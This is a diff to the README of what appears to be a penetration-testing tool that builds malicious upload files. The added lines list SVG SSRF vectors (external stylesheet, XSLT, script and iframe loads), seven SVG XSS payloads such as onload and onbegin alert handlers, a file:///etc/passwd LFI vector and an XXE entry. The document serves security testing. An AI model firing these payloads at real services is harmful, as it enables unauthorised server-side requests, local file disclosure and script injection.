@@ -101,7 +101,14 @@ When you receive an OOB request on your Burp Collaborator, use this table to ide
 | `/img-xlsx.png` | XLSX | SSRF | Images remote via drawing → blip r:link | xl/drawings/drawing1.xml + rels |
 | `file:///etc/passwd` | XLSX | LFI | =HYPERLINK("file:///etc/passwd") | xl/worksheets/sheet1.xml |
 | `/xxe-xlsx` | XLSX | XXE | sharedStrings.xml / workbook.xml DOCTYPE | xl/sharedStrings.xml or workbook.xml |
-| `/s1` | SVG | SSRF | <image href="http://…"> | SVG root |
+| `/img1` | SVG | SSRF | <image xlink:href="http://…"> | SVG root |
+| `/use1` | SVG | SSRF | <use xlink:href="http://…"> | SVG root |
+| `/css-link` | SVG | SSRF | <link rel="stylesheet" href="http://…"> | SVG root |
+| `/css-import` | SVG | SSRF | @import url(http://…) | SVG style |
+| `/xml-stylesheet` | SVG | SSRF | <?xml-stylesheet href="http://…"?> | SVG root |
+| `/xslt` | SVG | SSRF | <?xml-stylesheet href="http://…" type="text/xsl"?> | SVG root |
+| `/script-external` | SVG | SSRF | <script src="http://…"> | SVG root |
+| `/foreignobject-iframe` | SVG | SSRF | <foreignObject><iframe src="http://…"> | SVG root |
 | `file:///etc/passwd` | SVG | LFI | <image href="file:///etc/passwd"> | SVG root |
 | `/xxe-svg` | SVG | XXE | DOCTYPE + ENTITY direct | SVG root |
 | `/xxe-png` | PNG | XXE/SSRF | iTXt chunk "XML:com.adobe.xmp" with DOCTYPE + URL | iTXt chunk |
@@ -182,7 +189,7 @@ When you receive an OOB request on your Burp Collaborator, use this table to ide
 
 ### Web Formats
 - **HTML**: XSS (2 techniques), SSRF (4 techniques), RCE (2 techniques)
-- **SVG**: SSRF (1 technique), LFI (1 technique), XXE (1 technique), XSS (3 techniques)
+- **SVG**: SSRF (8 techniques), LFI (1 technique), XXE (1 technique), XSS (7 techniques)
 - **XML**: XXE (5 techniques), XSS (4 techniques), Path Traversal (2 techniques)
 
 ### Images
@@ -209,7 +216,7 @@ Master payloads are available at the root of each extension directory:
 - `pdf/master2_rce.pdf` - Contains only RCE techniques (Ghostscript/PostScript) as they may break the main master
 - `docx/master.docx` - Contains all techniques SSRF, LFI, XXE
 - `xlsx/master.xlsx` - Contains all techniques SSRF, LFI, XXE
-- `svg/master.svg` - Contains all techniques SSRF, LFI, XXE
+- `svg/master.svg` - Contains all techniques SSRF (8 techniques), LFI, XXE, XSS (7 techniques)
 - `png/master.png` - Contains SSRF/XXE techniques
 - `png/master2_rce.png` - Contains only RCE techniques (ImageMagick)
 - `jpg/master.jpg` - Contains SSRF/XXE techniques
@@ -343,19 +350,30 @@ Master payloads are available at the root of each extension directory:
 
 ## Detailed SVG Techniques
 
-### XSS
-1. **<svg onload=alert(1)> or <script>alert(1)</script>** - SVG root - ALL SVG parsers (Batik, librsvg, Chrome, ImageMagick, browsers)
-2. **<image href="x" onerror=alert(1)>** - SVG root - ALL
-3. **<animate onbegin=alert(1)>** - SVG root - All except some WAF
-
 ### SSRF
-1. **<image href="http://…">** - SVG root - Batik, librsvg, ImageMagick, Resvg
+1. **<image xlink:href="http://…">** - SVG root - Batik, librsvg, ImageMagick, Resvg, Chrome, Firefox
+2. **<use xlink:href="http://…">** - SVG root - Batik, librsvg, ImageMagick, Chrome, Firefox
+3. **<link rel="stylesheet" href="http://…">** - SVG root - Batik, librsvg, Chrome, Firefox
+4. **@import url(http://…)** - SVG style - Batik, librsvg, Chrome, Firefox
+5. **<?xml-stylesheet href="http://…"?>** - SVG root - Batik, librsvg, Chrome, Firefox
+6. **<?xml-stylesheet href="http://…" type="text/xsl"?>** - SVG root - XSLT processors, Chrome
+7. **<script src="http://…">** - SVG root - Batik, librsvg, Chrome, Firefox
+8. **<foreignObject><iframe src="http://…">** - SVG root - Chrome, Firefox, Batik
 
 ### LFI
-2. **<image href="file:///etc/passwd">** - SVG root - librsvg, ImageMagick
+1. **<image href="file:///etc/passwd">** - SVG root - librsvg, ImageMagick
 
 ### XXE
-3. **DOCTYPE + ENTITY direct** - SVG root - Batik, Inkscape
+1. **DOCTYPE + ENTITY direct** - SVG root - Batik, Inkscape, XML parsers
+
+### XSS
+1. **<svg onload=alert(1)>** - SVG root - ALL SVG parsers (Batik, librsvg, Chrome, ImageMagick, browsers)
+2. **<script>alert(1)</script>** - SVG root - ALL SVG parsers (Batik, librsvg, Chrome, ImageMagick, browsers)
+3. **<image href="x" onerror=alert(1)>** - SVG root - ALL
+4. **<animate onbegin=alert(1)>** - SVG root - All except some WAF
+5. **<script src="javascript:alert(1)">** - SVG root - Chrome, Firefox
+6. **<image onload="alert(1)">** - SVG root - Chrome, Firefox
+7. **<foreignObject><iframe src="data:text/html,…">** - SVG root - Chrome, Firefox
 
 ## Detailed Image Techniques
 
@@ -484,6 +502,12 @@ Features:
 - Test all generated payloads for vulnerabilities
 
 See `test-app/README.md` for more details.
+
+## References
+
+- [SVG SSRF Cheatsheet](https://github.com/allanlw/svg-cheatsheet) - Comprehensive cheatsheet for exploiting server-side SVG processors
+- [Malicious PDF](https://github.com/jonaslejon/malicious-pdf) - Collection of malicious PDF files for security testing
+- [PayloadsAllThePDFs](https://github.com/luigigubello/PayloadsAllThePDFs) - Collection of PDF payloads for security testing
 
 ## Contribution
 
